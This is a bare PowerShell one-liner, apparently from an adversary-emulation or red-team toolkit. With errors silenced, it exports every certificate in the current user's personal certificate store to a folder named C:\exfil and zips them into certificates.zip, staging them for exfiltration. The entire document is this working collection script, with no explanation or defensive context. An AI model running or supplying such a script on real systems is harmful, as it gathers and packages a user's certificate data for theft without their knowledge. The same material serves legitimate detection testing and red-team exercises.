$archive="C:\exfil\certificates.zip";$exfilpath="C:\exfil";$ErrorActionPreference = 'SilentlyContinue';Add-Type -assembly "system.io.compression.filesystem";If(Test-path $archive) {Remove-item $archive};$x=0;foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer;$x+=1};[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive); Write-Host "$x certs written to zip."
